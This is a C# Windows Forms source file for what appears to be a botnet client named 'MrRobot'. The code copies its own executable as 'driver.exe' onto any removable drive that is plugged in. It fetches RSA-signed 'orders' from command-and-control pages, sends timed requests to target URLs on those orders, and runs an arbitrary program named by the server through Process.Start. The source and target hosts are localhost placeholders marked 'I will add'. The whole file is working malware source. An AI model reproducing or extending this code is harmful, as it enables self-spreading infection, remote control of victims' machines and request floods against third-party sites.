using System;
using System.Globalization;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace MrRobot
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            if (!string.IsNullOrEmpty(Properties.Settings.Default.Order))
            {
                CurrentOrder = ParseOrder(Properties.Settings.Default.Order);
                if (CurrentOrder != null)
                    RequestTimer.Interval = CurrentOrder.Interval * 1000;
            }
            RSAalg.FromXmlString(PublicKey);
            try
            {
                var id = Properties.Settings.Default.Id;
            }
            catch
            {
                Properties.Settings.Default.Id = Guid.NewGuid();
                Properties.Settings.Default.No = (byte)new Random().Next(0, 99);
                Console.WriteLine(Properties.Settings.Default.No);
                Properties.Settings.Default.Save();
            }
            wc.Headers.Add("User-Agent", UserAgent);
            wc.Encoding = System.Text.Encoding.UTF8;

            Analytics.Log(Properties.Settings.Default.Id, "Win", "App", "Started", 1);
        }
        protected override void WndProc(ref Message m)
        {
            base.WndProc(ref m);
            if (m.Msg == 0x219)
            {
                DriveInfo[] Drives = DriveInfo.GetDrives();
                for (int i = 0; i < Drives.Length; i++)
                {
                    if (Drives[i].DriveType == DriveType.Removable)
                    {
                        var path = Drives[i].RootDirectory.FullName + "\\driver.exe";
                        if (!File.Exists(path))
                        {
                            try
                            {
                                System.IO.File.Copy(Application.ExecutablePath, path, true);
                            }
                            catch { }
                        }
                    }
                }
            }
        }
        string[] Sources = new string[] {
            "http://localhost:81/index.html"
//I will add


        };
        string[] Targets = new string[] {
            "http://localhost:81/index.html"
//I will add
        };
        Order CurrentOrder = null;
        static readonly string UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36";
        private void button1_Click(object sender, EventArgs e)
        {

            WebClient wc = new WebClient();
            wc.Encoding = System.Text.Encoding.UTF8;
            var startTime = DateTime.Now;

        }
        WebClient wc = new WebClient();

        private void RequestTimer_Tick(object sender, EventArgs e)
        {
            Analytics.Log(Properties.Settings.Default.Id, "Win", "Job", "Tick", 1);
            //#if DEBUG
            //wc.DownloadString("http://localhost:81/index.html");
            //#else
            if (CurrentOrder == null)
            {
                if (Properties.Settings.Default.No < 50 && DateTime.Now.Hour == 9)
                    wc.DownloadString(Targets[System.DateTime.Today.DayOfYear % Targets.Length]);
            }
            else
            {
                if (CurrentOrder.Start < DateTime.Now && CurrentOrder.End > DateTime.Now)
                {
                    if (CurrentOrder.Force > Properties.Settings.Default.No &&
                        DateTime.Now.Hour >= CurrentOrder.StartHour &&
                        DateTime.Now.Hour < CurrentOrder.EndHour)
                    {
                        wc.DownloadString(CurrentOrder.Url);
                    }
                }
                else
                {
                    CurrentOrder = null;
                    Properties.Settings.Default.Order = "";
                    Properties.Settings.Default.Save();
                }

            }
            //#endif

        }
        private void OrderUpdateTimer_Tick(object sender, EventArgs e)
        {

            if (CurrentOrder != null)
                return;

            ASCIIEncoding ByteConverter = new ASCIIEncoding();
            bool Found = false;
            for (int i = 0; i < Sources.Length; i++)
            {
                try
                {
                    var page = wc.DownloadString(Sources[i]);
                    while (page.Contains("START"))
                    {
                        try
                        {
                            page = page.Substring(page.IndexOf("START") + 6);
                            var data = page.Substring(0, page.IndexOf("ENDCCC")).Split('|');
                            page = page.Substring(data[0].Length + data[1].Length);
                            if (VerifySignedHash(ByteConverter.GetBytes(data[1]), StringToByteArrayFastest(data[0])))
                            {
                                var NewCurrentOrder = ParseOrder(data[1]);
                                if (NewCurrentOrder == null)
                                    continue;
                                CurrentOrder = NewCurrentOrder;
                                if (CurrentOrder.Interval > 0)
                                    RequestTimer.Interval = CurrentOrder.Interval * 1000;
                                Properties.Settings.Default.Order = data[1];
                                Properties.Settings.Default.NextId = NewCurrentOrder.NextId;
                                Properties.Settings.Default.Save();
                                Analytics.Log(Properties.Settings.Default.Id, "Win", "App", "OrderUpdate", 1);
                                break;
                            }
                        }
                        catch { }
                    }
                    if (Found)
                        break;
                }
                catch { }
            }
            if (!Found)
            {



            }
        }

        private Order ParseOrder(string page)
        {

            var splited = page.Split('*');
            var NextIdString = Properties.Settings.Default.NextId.ToString();
            Console.WriteLine(NextIdString);
            Console.WriteLine(splited[0]);
            if (NextIdString != splited[0])
                return null;
            if (splited.Length == 4)
            {
                if (Properties.Settings.Default.LastMessage != splited[1])
                {
                    Properties.Settings.Default.LastMessage = splited[1];

                    Properties.Settings.Default.Save();
                    MessageBox.Show(splited[1], "پیام مهم");


                    try
                    {
                        System.Diagnostics.Process.Start(splited[2]);
                    }
                    catch { }
                }
                return new Order
                {
                    Id = Guid.Parse(splited[0]),
                    NextId = Guid.Parse(splited[3])
                };
            }
            try
            {
                return new Order
                {
                    Id = Guid.Parse(splited[0]),
                    Start = DateTime.Parse(splited[1], CultureInfo.InvariantCulture),
                    End = DateTime.Parse(splited[2], CultureInfo.InvariantCulture),
                    StartHour = byte.Parse(splited[3]),
                    EndHour = byte.Parse(splited[4]),
                    Force = byte.Parse(splited[5]),
                    Interval = byte.Parse(splited[6]),
                    Url = splited[7],
                    NextId = Guid.Parse(splited[8])
                };
            }
            catch { }
            return null;
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void SignChecker_Click(object sender, EventArgs e)
        {
            OrderUpdateTimer_Tick(null, null);
            //Hide();
        }

        public static byte[] StringToByteArrayFastest(string hex)
        {
            if (hex.Length % 2 == 1)
                return null;
            byte[] arr = new byte[hex.Length >> 1];
            for (int i = 0; i < hex.Length >> 1; ++i)
            {
                arr[i] = (byte)((GetHexVal(hex[i << 1]) << 4) + (GetHexVal(hex[(i << 1) + 1])));
            }

            return arr;
        }

        public static int GetHexVal(char hex)
        {
            int val = hex;
            return val - (val < 58 ? 48 : (val < 97 ? 55 : 87));
        }
        public const string PublicKey = "<RSAKeyValue><Modulus>ylx+3KgPlS/S0vUbLEv2fBhbDOwZ6VO+XgEBMhlMiHAbDXmTACOmcrJxdwZ3OhLwbWkcXcieJchO0W7kj7xg08kVq5WZU+xxIu6qV6uoZ7iK8l8zVhTOIYytSIXw3WuKeHY4tV6wCA4UV+U6ty7XH5n27Gy9iBP+kMrrcRBont0=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>";
        RSACryptoServiceProvider RSAalg = new RSACryptoServiceProvider();

        public bool VerifySignedHash(byte[] DataToVerify, byte[] SignedData)
        {
            try
            {
                return RSAalg.VerifyData(DataToVerify, new SHA1CryptoServiceProvider(), SignedData);
            }
            catch (CryptographicException e)
            {
                Console.WriteLine(e.Message);

                return false;
            }
        }
    }
}
